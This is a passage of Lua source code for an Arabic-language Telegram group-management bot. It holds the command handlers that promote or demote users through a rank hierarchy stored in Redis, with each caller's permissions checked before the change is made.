if bot.getChatMember(msg.chat_id,UserName).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*‹ : "..tt.." .*").yu,"md",true)  
return false
end
if text and text:match('^تنزيل الكل @(%S+)$') then
local UserName = text:match('^تنزيل الكل @(%S+)$') 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if Get_Rank(UserId_Info.id,msg.chat_id)== "العضو" then
tt = "لا يمتلك رتبه بالفعل"
else
tt = "تم تنزيله من جميع الرتب بنجاح"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",UserId_Info.id)
redis:srem(bot_id..":Status:developer",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,UserId_Info.id).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*‹ : "..tt.." .*").yu,"md",true)  
return false
end
if text == "تنزيل الكل" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if Get_Rank(Remsg.sender.user_id,msg.chat_id)== "العضو" then
tt = "لا يمتلك رتبه بالفعل"
else
tt = "تم تنزيله من جميع الرتب بنجاح"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",Remsg.sender.user_id)
redis:srem(bot_id..":Status:developer",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,Remsg.sender.user_id).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*‹ : "..tt.." .*").yu,"md",true)  
return false
end
if text and text:match('^رفع (.*) (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^رفع (.*) (%d+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الرفع معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if redis:sismember(bot_id..srt1.."Status:"..srt,UserName) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*‹ : تم رفعه سابقا .*").i,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*‹ : تم رفعه بنجاح .*").i,"md",true)  
return false
end
end
if text and text:match('^رفع (.*) @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^رفع (.*) @(%S+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الرفع معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if redis:sismember(bot_id..srt1.."Status:"..srt,UserId_Info.id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*‹ : تم رفعه سابقا .*").i,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*‹ : تم رفعه بنجاح .*").i,"md",true)  
return false
end
end
if text and text:match("^رفع (.*)$") and tonumber(msg.reply_to_message_id) ~= 0 then
local TextMsg = text:match("^رفع (.*)$")
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الرفع معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if redis:sismember(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*‹ : تم رفعه سابقا .*").i,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*‹ : تم رفعه بنجاح .*").i,"md",true)  
return false
end
end
if text and text:match('^تنزيل (.*) (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^تنزيل (.*) (%d+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not redis:sismember(bot_id..srt1.."Status:"..srt,UserName) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*‹ : لا يمتلك رتبه بالفعل .*").yu,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*‹ : تم تنزيله بنجاح .*").i,"md",true)  
return false
end
end
if text and text:match('^تنزيل (.*) @(%S+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^تنزيل (.*) @(%S+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*‹ : اليوزر لقناه او مجموعه تأكد منه .*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
